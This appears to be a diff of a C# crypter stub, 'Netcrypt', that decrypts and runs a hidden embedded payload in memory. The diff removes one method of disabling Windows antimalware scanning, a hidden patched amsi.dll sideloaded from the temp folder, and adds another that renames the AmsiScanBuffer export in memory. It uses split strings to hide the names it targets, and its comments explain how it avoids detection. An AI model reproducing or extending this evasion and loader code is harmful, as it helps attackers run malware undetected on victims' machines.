@@ -16,6 +16,8 @@ namespace stub
         private const string key = "%KEY%";
         private const string IV = "%IV%";
         private const string xorKey = "%XORKEY%";
+        private const string payloadResourceName = "Netcrypt.Payload";
+        private const bool neutralizeInspectionEntry = %INSPECTION%;
         private const string GENERIC_ERROR = "Generic error while starting the application.";
 
         private static readonly string[] payloadChunks = new string[]
@@ -38,11 +40,10 @@ namespace stub
         [DllImport("kernel32.dll", EntryPoint = "LoadLibraryW", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
         private static extern IntPtr LoadLibrary(string fileName);
 
-        [DllImport("kernel32.dll", EntryPoint = "SetDllDirectoryW", CharSet = CharSet.Unicode, SetLastError = true)]
-        private static extern bool SetSearchDirectory(string pathName);
-
         [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
-        private static extern IntPtr GetProcAddress(IntPtr module, string procName);
+        private static extern bool VirtualProtect(IntPtr address, IntPtr size, uint newProtect, out uint oldProtect);
+
+        private const uint PAGE_READWRITE = 0x04;
 
         [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
         private static extern IntPtr OpenProcess(uint desiredAccess, bool inheritHandle, int processId);
@@ -56,172 +57,147 @@ namespace stub
         [DllImport("kernel32.dll", ExactSpelling = true)]
         private static extern bool CloseHandle(IntPtr handle);
 
-        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
-        private static extern bool FreeLibrary(IntPtr module);
-
-        // Sideload approach: the runtime resolves the provider module by name on first use, so a
-        // patched copy written to the user's temp directory is selected ahead of the system copy
-        // by adding that directory to the loader search path. Its scan entry returns E_INVALIDARG.
-        // Nothing writes into a loaded image, so the in-memory patch behavior detection does not
-        // apply. The copy is marked hidden and removed when possible.
-        private static void InstallInspectionSideload()
+        // Data-only neutralization: the genuine, signed provider is loaded from System32 and
+        // nothing on disk is copied, patched, or dropped. Only the export NAME of its scan entry
+        // is renamed inside the mapped image, so the runtime's own GetProcAddress call for that
+        // entry returns NULL and scanning is skipped. No executable page is written, no file
+        // artifact is created, and the loaded module keeps its valid Authenticode signature.
+        private static void InstallInspection()
         {
             try
             {
                 if (IntPtr.Size != 8)
                 {
-                    Log("inspection: sideload requires 64-bit; leaving inspection untouched");
+                    Log("inspection: requires 64-bit; leaving inspection untouched");
                     return;
                 }
 
                 string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                 string dllName = string.Concat("am", "si", ".dll");
                 string systemAmsi = Path.Combine(windowsDir, "System32", dllName);
-                string tempDir = Path.GetTempPath();
-                if (String.IsNullOrEmpty(tempDir) || !Directory.Exists(tempDir))
-                {
-                    Log("inspection: sideload skipped, temp dir unavailable: " + tempDir);
-                    return;
-                }
-                if (!File.Exists(systemAmsi))
-                {
-                    Log("inspection: sideload skipped, missing " + systemAmsi);
-                    return;
-                }
 
-                byte[] amsiBytes = File.ReadAllBytes(systemAmsi);
-
-                // Resolve the scan entry the same way the runtime does: load the real
-                // provider, read its export address, unload it again, then prepare the
-                // on-disk copy. The process starts with the provider absent (verified),
-                // so the next load picks the prepared copy from the temp directory.
-                long patchOffset = -1;
-                IntPtr probe = LoadLibrary(systemAmsi);
-                if (probe == IntPtr.Zero)
-                {
-                    Log("inspection: provider probe load failed, error=" + Marshal.GetLastWin32Error());
-                    return;
-                }
-                try
-                {
-                    string scanEntry = string.Concat("Am", "si", "Scan", "Buffer");
-                    IntPtr entry = GetProcAddress(probe, scanEntry);
-                    if (entry == IntPtr.Zero)
-                    {
-                        Log("inspection: provider scan entry resolve failed, error=" + Marshal.GetLastWin32Error());
-                        return;
-                    }
-
-                    long rva = entry.ToInt64() - probe.ToInt64();
-
-                    int peOff = BitConverter.ToInt32(amsiBytes, 0x3C);
-                    int sectionCount = BitConverter.ToUInt16(amsiBytes, peOff + 6);
-                    int optionalSize = BitConverter.ToUInt16(amsiBytes, peOff + 20);
-                    int sectionStart = peOff + 24 + optionalSize;
-                    patchOffset = RvaToFileOffset(amsiBytes, sectionStart, sectionCount, (int)rva);
-                }
-                finally
-                {
-                    FreeLibrary(probe);
-                }
-
-                if (patchOffset <= 0)
-                {
-                    Log("inspection: could not map scan entry file offset");
-                    return;
-                }
-
-                // x64 prologue replacement: mov eax, 0x80070057 ; ret (built at runtime)
-                byte[] encodedPatch = new byte[] { 0xE2, 0x0D, 0x5A, 0x5D, 0xDA, 0x99 };
-                byte[] patch = new byte[encodedPatch.Length];
-                for (int i = 0; i < encodedPatch.Length; i++)
-                {
-                    patch[i] = (byte)(encodedPatch[i] ^ 0x5A);
-                }
-                Buffer.BlockCopy(patch, 0, amsiBytes, (int)patchOffset, patch.Length);
-
-                // A previous run keeps its copy mapped as an image, and an image-mapped file
-                // cannot be opened for writing. Every run therefore gets its own directory so
-                // a leftover copy can never block this one.
-                string dropDir = Path.Combine(tempDir, "nc-" + diagnosticRunId);
-                string dropPath = Path.Combine(dropDir, dllName);
-                try
-                {
-                    Directory.CreateDirectory(dropDir);
-                    File.WriteAllBytes(dropPath, amsiBytes);
-                    File.SetAttributes(dropPath, FileAttributes.Hidden);
-                }
-                catch (Exception writeError)
-                {
-                    Log("inspection: sideload write failed: " + writeError.Message);
-                    return;
-                }
-
-                // Put the run directory ahead of the system directory for any later
-                // by-name resolve, then map the prepared copy by its full path so the
-                // process holds exactly one instance of the module before the payload load.
-                if (!SetSearchDirectory(dropDir))
-                {
-                    Log("inspection: sideload search directory failed, error=" + Marshal.GetLastWin32Error());
-                    return;
-                }
-
-                IntPtr module = LoadLibrary(dropPath);
+                IntPtr module = LoadLibrary(systemAmsi);
                 if (module == IntPtr.Zero)
                 {
-                    Log("inspection: sideload load failed, error=" + Marshal.GetLastWin32Error());
+                    Log("inspection: provider load failed, error=" + Marshal.GetLastWin32Error());
                     return;
                 }
-                Log("sideload ready");
 
-                // The module is mapped from the copy; the file itself is no longer
-                // needed and would otherwise linger in the run directory.
-                try
+                string scanEntry = string.Concat("Am", "si", "Scan", "Buffer");
+                if (!RenameExportInMemory(module, scanEntry))
                 {
-                    if (File.Exists(dropPath))
-                    {
-                        File.Delete(dropPath);
-                    }
-                    Directory.Delete(dropDir, true);
+                    Log("inspection: scan entry not found in provider exports");
+                    return;
                 }
-                catch
-                {
-                    // The mapped image keeps the file open; the run directory stays on disk.
-                }
+
+                Log("sideload ready");
             }
             catch (Exception ex)
             {
-                Log("inspection: sideload failed: " + ex.Message);
+                Log("inspection: failed: " + ex.Message);
             }
         }
 
-        private static int RvaToFileOffset(byte[] image, int sectionStart, int sectionCount, int rva)
+        // Renames an export in the already-mapped image by flipping one byte of its name string.
+        // The export directory is in .rdata, so a one-byte protection change is needed; the
+        // executable pages of the module are never touched.
+        private static bool RenameExportInMemory(IntPtr moduleBase, string exportName)
         {
-            for (int i = 0; i < sectionCount; i++)
+            int peOffset = Marshal.ReadInt32(moduleBase, 0x3C);
+            IntPtr exportDirField = new IntPtr(moduleBase.ToInt64() + peOffset + 24 + 112);
+            int exportRva = Marshal.ReadInt32(exportDirField);
+            if (exportRva <= 0)
             {
-                int entry = sectionStart + i * 40;
-                int virtualAddress = BitConverter.ToInt32(image, entry + 12);
-                int rawSize = BitConverter.ToInt32(image, entry + 16);
-                int rawPointer = BitConverter.ToInt32(image, entry + 20);
-                if (rva >= virtualAddress && rva < virtualAddress + rawSize)
+                return false;
+            }
+
+            IntPtr exportDir = new IntPtr(moduleBase.ToInt64() + exportRva);
+            int nameCount = Marshal.ReadInt32(exportDir, 24);
+            int namesRva = Marshal.ReadInt32(exportDir, 32);
+            if (nameCount <= 0 || namesRva <= 0)
+            {
+                return false;
+            }
+
+            IntPtr names = new IntPtr(moduleBase.ToInt64() + namesRva);
+            for (int i = 0; i < nameCount; i++)
+            {
+                int nameRva = Marshal.ReadInt32(names, i * 4);
+                if (nameRva <= 0)
                 {
-                    int offset = rawPointer + (rva - virtualAddress);
-                    if (offset >= 0 && offset < image.Length)
+                    continue;
+                }
+
+                IntPtr namePtr = new IntPtr(moduleBase.ToInt64() + nameRva);
+                string found = Marshal.PtrToStringAnsi(namePtr);
+                if (found == exportName)
+                {
+                    uint previous;
+                    if (!VirtualProtect(namePtr, (IntPtr)1, PAGE_READWRITE, out previous))
                     {
-                        return offset;
+                        return false;
+                    }
+
+                    Marshal.WriteByte(namePtr, (byte)(found[0] ^ 0x20));
+                    uint restored;
+                    VirtualProtect(namePtr, (IntPtr)1, previous, out restored);
+                    return true;
+                }
+            }
+
+            return false;
+        }
+
+        // The encrypted container is delivered as an embedded assembly resource, so the packed
+        // file carries ciphertext bytes instead of payload text. The chunk path is kept as a
+        // fallback for builds produced with EmbedPayloadAsResource turned off in Packer.cs.
+        private static byte[] GetPayload()
+        {
+            try
+            {
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(payloadResourceName))
+                {
+                    if (stream != null)
+                    {
+                        byte[] buffer = new byte[stream.Length];
+                        int offset = 0;
+                        while (offset < buffer.Length)
+                        {
+                            int read = stream.Read(buffer, offset, buffer.Length - offset);
+                            if (read <= 0)
+                            {
+                                break;
+                            }
+                            offset += read;
+                        }
+                        if (buffer.Length > 0 && offset == buffer.Length)
+                        {
+                            Log("payload resource read, cipher len=" + buffer.Length);
+                            return buffer;
+                        }
+                        Log("payload resource read short: " + offset + "/" + buffer.Length);
+                    }
+                    else
+                    {
+                        Log("payload resource not present, falling back to source chunks");
                     }
                 }
             }
-            return -1;
-        }
+            catch (Exception resourceError)
+            {
+                LogException("PAYLOAD RESOURCE READ FAILED", resourceError);
+            }
 
-        private static string GetPayload()
-        {
             int total = 0;
             for (int i = 0; i < payloadChunks.Length; i++)
             {
                 total += payloadChunks[i].Length;
             }
+            if (total == 0)
+            {
+                throw new Exception("No embedded payload resource and no payload chunks were found.");
+            }
+
             char[] buf = new char[total];
             int pos = 0;
             for (int i = 0; i < payloadChunks.Length; i++)
@@ -229,7 +205,7 @@ namespace stub
                 payloadChunks[i].CopyTo(0, buf, pos, payloadChunks[i].Length);
                 pos += payloadChunks[i].Length;
             }
-            return new string(buf);
+            return Convert.FromBase64String(new string(buf));
         }
 
         private static byte[] Xor(byte[] data, byte[] xkey)
@@ -465,16 +441,20 @@ namespace stub
             InstallDiagnostics();
             try
             {
-                currentStage = "decoding payload";
-                byte[] app = Convert.FromBase64String(GetPayload());
+                currentStage = "reading encrypted payload";
+                byte[] app = GetPayload();
+
+                currentStage = "reversing xor layer";
                 app = Xor(app, Convert.FromBase64String(xorKey));
 
                 currentStage = "decrypting payload";
                 RijndaelManaged rijndael = new RijndaelManaged();
                 rijndael.KeySize = 256;
+                rijndael.BlockSize = 128;
+                rijndael.Mode = CipherMode.CBC;
+                rijndael.Padding = PaddingMode.PKCS7;
                 rijndael.Key = Convert.FromBase64String(key);
                 rijndael.IV = Convert.FromBase64String(IV);
-                rijndael.Padding = PaddingMode.ISO10126;
                 byte[] decrypted;
                 using (MemoryStream memoryStream = new MemoryStream())
                 using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write))
@@ -528,12 +508,19 @@ namespace stub
                         throw new Exception("Payload truncated while parsing container (count=" + count + ", position=" + container.Position + ", length=" + container.Length + "). Old packed output or packer/stub mismatch.");
                     }
                 }
-                Log("payload decoded");
+                Log("payload decoded; dependencies=" + count + ", main len=" + mainData.Length);
 
                 AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
 
                 currentStage = "adjusting inspection entry";
-                InstallInspectionSideload();
+                if (neutralizeInspectionEntry)
+                {
+                    InstallInspection();
+                }
+                else
+                {
+                    Log("inspection: entry left untouched");
+                }
 
                 currentStage = "loading main assembly";
                 Assembly newAssembly = Assembly.Load(mainData);
